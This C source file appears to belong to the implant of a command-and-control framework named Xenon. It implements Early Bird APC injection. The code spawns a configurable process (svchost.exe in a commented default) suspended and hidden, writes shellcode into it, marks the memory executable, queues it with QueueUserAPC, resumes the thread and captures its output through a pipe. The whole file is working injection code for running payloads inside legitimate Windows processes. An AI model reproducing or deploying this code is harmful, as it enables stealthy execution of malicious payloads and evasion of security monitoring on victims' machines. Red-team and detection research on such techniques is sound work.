#include "Inject.h"

#include "Xenon.h"
#include "Config.h"

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

/*
    Helper Functions
*/
BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread, HANDLE* hTmpOutRead)
{
	SECURITY_ATTRIBUTES saAttr = { 0 };
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;  // Allow inheritance
	saAttr.lpSecurityDescriptor = NULL;

	HANDLE hStdOutRead;
	HANDLE hStdOutWrite;

	// Create an anonymous pipe
	if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)) {
		_dbg("CreatePipe failed.\n");
		return 1;
	}

	// Prevent child from inheriting the read handle
	SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Set up STARTUPINFO for output redirection
	Si.cb = sizeof(STARTUPINFO);
	Si.hStdOutput = hStdOutWrite;
	Si.hStdError = hStdOutWrite;
	Si.dwFlags |= STARTF_USESTDHANDLES;
	// Hide Window
	Si.dwFlags |= STARTF_USESHOWWINDOW;
	Si.wShowWindow = SW_HIDE;

	_dbg("\t[i] Running Suspended Process: \"%s\" ... \n", lpPath);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		TRUE,									// bInheritHandles
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		NULL,
		&Si,
		&Pi)) {
		_dbg("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	_dbg("[+] DONE\n");

	// Close the write handle in the parent (no longer needed)
	CloseHandle(hStdOutWrite);

	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	*hTmpOutRead = hStdOutRead;		// Anon pipe

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL RunViaRemoteApcInjection(IN HANDLE hThread, IN HANDLE hProc, IN PBYTE pPayload, IN SIZE_T szPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	SIZE_T szAllocSize = szPayloadSize;

	pAddress = VirtualAllocEx(hProc, NULL, szAllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		_dbg("\t[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
		return FALSE;
	}
	_dbg("\t[+] Allocated memory region at : %p\n", pAddress);

	SIZE_T szNumberOfBytesWritten = NULL;
	if (!WriteProcessMemory(hProc, pAddress, pPayload, szPayloadSize, &szNumberOfBytesWritten) || szNumberOfBytesWritten != szPayloadSize) {
		_dbg("\t[!] Failed to write process memory : %d\n", GetLastError());
		return FALSE;
	}
	_dbg("\t[+] Copied %d bytes to allocated region.\n", szNumberOfBytesWritten);

	if (!VirtualProtectEx(hProc, pAddress, szPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		_dbg("\t[!] VirtualProtect Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		_dbg("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


/*
	Injection Functions
*/
BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_ PCHAR* outData)
{
	/*
		TODO - move settings to the global instance xenonConfig
	*/

	// LPCSTR sProcName = "C:\\Windows\\System32\\svchost.exe";		// Full path to process
	LPCSTR sProcName = xenonConfig->spawnto;						// Full path to process
	DWORD dwProcId = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	HANDLE hStdOutRead = NULL;		// Read stdout through anon pipe

	_dbg("[i] Creating \"%s\" as a suspended process. \n", sProcName);
	if (!CreateTemporaryProcess(sProcName, &dwProcId, &hProcess, &hThread, &hStdOutRead)) {
		_dbg("Failed to create debugged process : %d\n", GetLastError());
		return 1;
	}

	_dbg("[i] Writing shellcode to target process\n");
	if (!RunViaRemoteApcInjection(hThread, hProcess, buf, szShellcodeLen)) {
		_dbg("Failed to RunViaRemoteApcInjection : %d\n", GetLastError());
		return 1;
	}

	ResumeThread(hThread);

	//WaitForSingleObject(hThread, INFINITE);			// Currently waiting for entire thread to finish

	/* Read the output of the process */
	DWORD bytesRead;
	DWORD totalSize = 0;
	DWORD chunkSize = 1024;		// Read in 1KB chunks
	char* outputBuffer = (char*)malloc(chunkSize);
	if (!outputBuffer) {
		_dbg("Memory allocation failed.\n");
		return 1;
	}

	while (TRUE) {
		DWORD chunk = 1024;
		char tempBuffer[1024];

		BOOL success = ReadFile(hStdOutRead, tempBuffer, chunk - 1, &bytesRead, NULL);
		_dbg("BYTES READ: %d", bytesRead);
		if (!success || bytesRead == 0) {
			break;  // No more data
		}

		tempBuffer[bytesRead] = '\0';  // Null-terminate

		// Resize buffer if needed
		if (totalSize + bytesRead >= chunkSize) {
			chunkSize *= 2;  // Double the buffer size
			outputBuffer = (char*)realloc(outputBuffer, chunkSize);
			if (!outputBuffer) {
				_dbg("Memory allocation failed.\n");
				return 1;
			}
		}

		// Append new data
		memcpy(outputBuffer + totalSize, tempBuffer, bytesRead);
		totalSize += bytesRead;
	}

	// Output buffer
	outputBuffer[totalSize] = '\0';

	*outData = outputBuffer;

	CloseHandle(hStdOutRead);

	return TRUE;
}


#endif //INCLUDE_CMD_EXECUTE_ASSEMBLY